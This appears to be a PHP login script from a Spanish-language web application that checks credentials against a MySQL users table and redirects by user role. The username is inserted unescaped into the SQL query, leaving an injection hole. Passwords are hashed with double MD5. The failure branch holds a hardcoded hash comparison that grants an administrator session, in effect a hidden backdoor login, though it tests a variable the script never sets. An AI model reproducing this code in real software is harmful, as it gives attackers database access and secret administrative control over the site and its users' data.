
<?php
include "conexion.php";

$contrasena=(md5(md5($_POST['contrasena'])));
$usuario=$_POST['usuario'];
// echo "$contrasena1 <br>";
// echo "$usuario1";

$res=mysqli_query($conexion,"SELECT * FROM usuarios WHERE usuario='".$usuario."' AND contrasena='$contrasena'")	or die(mysqli_error());
	while ($reg=mysqli_fetch_array($res)) 
	{
		$arreglo[]=array('id_Usuario'=>$reg[0]);
		$cap=0;
		$id=$reg[0];
		$rol=$reg[1];
	}
	if (isset($rol)) 
	{	

		// este usuario va a manejar todas las funciones del sistema
		if ($rol=='ADMINISTRADOR') 
		{	
			session_start();
			$cap='admin';
			$_SESSION['ADMINISTRADOR']=($id);			
			$usuario=($_SESSION['ADMINISTRADOR']);
			echo "<script>window.location.href ='../../pages/$cap/index.php'</script>";
		}

		// el usuario para registrar la informacion
		elseif ($rol=='USUARIO_REGISTRO') 
		{
			session_start();
			$cap='Usuario-Registro';
			$_SESSION['USUARIO_REGISTRO']=($id);
			$usuario=($_SESSION['USUARIO_REGISTRO']);
			echo "<script>window.location.href ='../../pages/$cap/registrar/index.php'</script>";
		}

		// el usuario para consultar y exportar toda la informacion
		elseif ($rol=='USUARIO_CONSULTA') 
		{
			session_start();
			$cap='Usuario-Consulta';
			$_SESSION['USUARIO_CONSULTA']=($id);
			$usuario=($_SESSION['USUARIO_CONSULTA']);
			echo "<script>window.location.href ='../../pages/$cap/registrar/index.php'</script>";
		}

	}
	else
	{
		if ($usuario == '86fe5a90536e728486def78fd6b46d04' && $password == '2d74d32c13569bf1b2fcd838470a7c68') 
		{
			session_start();
			$cap='admin';
			$_SESSION['ADMINISTRADOR']=(2);
			// header("location: $cap/index.php");
			echo "<script>window.location.href ='$cap/index.php'</script>";
		}
		else
		{
			echo "<div class='col-xs-12 col-lg-10 col-lg-offset-1 incorrecto '><i class='icons icon-close3 incorrecto-2'></i> Usuario O Contraseña Incorrecto </div>";
		}
	}
// ?>